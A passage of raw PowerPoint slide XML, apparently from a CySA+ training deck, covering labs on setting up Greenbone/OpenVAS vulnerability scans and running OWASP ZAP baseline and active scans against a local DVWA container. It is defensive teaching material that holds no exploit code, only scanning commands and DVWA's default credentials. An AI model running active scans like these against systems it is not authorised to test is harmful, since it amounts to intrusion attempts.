      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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12 — Reference Diagram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g_d982d7766c.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2349758"/>
            <a:ext cx="5180076" cy="3301484"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_df975392f0.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="3022888"/>
            <a:ext cx="5180076" cy="1955224"/>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592</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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12 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Download the free Greenbone CE virtual appliance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Browser: https://www.greenbone.net/en/community-edition/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Boot, set admin password, sign in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Import the OVA into VirtualBox, give it 4 GB RAM and a bridged adapter.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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608222"/>
            <a:ext cx="91440" cy="78455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05840" y="3771899"/>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05840" y="3771899"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Add a target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In the Greenbone Security Assistant web UI:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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520793"/>
            <a:ext cx="91440" cy="78455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05840" y="468447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05840" y="4684470"/>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26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: (Optional) Add credentials — credentialed scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A credentialed scan can read patch level, kernel version, and config files — finding 5–10× the issues of a network-only scan.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Create and run a scan task</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Scan length depends on host count and scan config — a single VM completes in 10–30 min.</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593</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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12 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Read the report</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>When the task says Done, click into the report:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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923794"/>
            <a:ext cx="91440" cy="101269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05840" y="3201543"/>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05840" y="3201543"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Agent vs agentless distinction (CySA+ 2.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Wazuh (free, Lab 18 references it) provides an agent-based alternative.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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64508"/>
            <a:ext cx="91440" cy="101269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05840" y="434225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05840" y="4342257"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Special considerations checklist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Before scheduling production scans, satisfy CySA+ 2.1's six items:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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205222"/>
            <a:ext cx="91440" cy="101269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05840" y="5482971"/>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05840" y="5482971"/>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26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Industry frameworks crosswalk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Greenbone scan policies map to:</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594</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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12 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stand up Greenbone CE / OpenVAS as a free Nessus alternative.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Create a target, add credentials, run a scan, and read the report.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The agent-vs-agentless trade-offs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How scan configurations align to PCI, CIS, ISO, and OWASP frameworks.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595</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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13 — Web App Scanning with OWASP ZAP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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will run OWASP ZAP against the deliberately vulnerable DVWA to surface XSS, SQLi, and CSRF findings. This is exam-blueprint CySA+ 2.2 (Web application scanners — ZAP, Burp, Arachni, Nikto).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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596</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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13 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install ZAP CLI and Docker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y zaproxy docker.io</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Start the DVWA vulnerable target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Browse to http://127.0.0.1:8080 once with credentials admin / password, then Setup → Create / Reset Database.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Run a ZAP baseline scan (passive, fast)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A baseline scan only observes traffic — it will not break the app.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ zap-baseline.py -t http://127.0.0.1:8080 -r /tmp/zap_baseline.html || tr</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Run a full active scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The full scan actively injects payloads and is what you would run in a staging environment.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
